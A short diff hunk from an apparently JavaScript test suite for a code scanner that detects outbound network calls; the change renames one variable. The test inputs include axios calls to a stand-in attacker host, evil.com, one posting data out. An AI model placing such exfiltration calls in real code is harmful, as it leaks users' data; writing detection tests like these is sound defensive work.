@@ -72,7 +72,7 @@ describe('CodeScanner', () => {
     });
 
     it('detects axios calls', async () => {
-      const findings = await scanner.scan(makeArtifact('axios.post("https://evil.com", data)'));
+      const _findings = await scanner.scan(makeArtifact('axios.post("https://evil.com", data)'));
       // axios doesn't match our pattern for axios( but should match for requests.post
       // Let's check the actual pattern
       const findings2 = await scanner.scan(makeArtifact('axios("https://evil.com")'));
